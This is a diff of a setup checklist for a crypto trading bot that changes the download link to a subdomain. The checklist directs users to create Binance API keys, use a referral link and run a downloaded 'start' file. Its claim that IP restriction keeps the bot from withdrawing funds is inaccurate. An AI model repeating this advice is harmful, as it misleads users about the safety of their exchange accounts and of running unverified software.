@@ -1,7 +1,7 @@
 # JaviD Future Bot — 10‑Minute Setup Checklist
 
 No coding required. You need about ten minutes and a Binance account.
-Full download & written guide: https://javid-dol.uk/ · Help: https://t.me/+P_CukTNNKRI4ZDVl
+Full download & written guide: https://javidfuturebot.javid-dol.uk/ · Help: https://t.me/+P_CukTNNKRI4ZDVl
 
 ## Step 1 — Binance account + API key
 - Create a Binance account (using the referral link on the website keeps the software free to run).
@@ -10,7 +10,7 @@ Full download & written guide: https://javid-dol.uk/ · Help: https://t.me/+P_Cu
 - Turn on **IP restriction**. This is a security feature: with it on, the bot **cannot** withdraw or move funds.
 
 ## Step 2 — Download & launch
-- Download from https://javid-dol.uk/ and double‑click `start`.
+- Download from https://javidfuturebot.javid-dol.uk/ and double‑click `start`.
 - The onboarding modal walks you through the first run to your dashboard.
 
 ## Step 3 — Connect the API
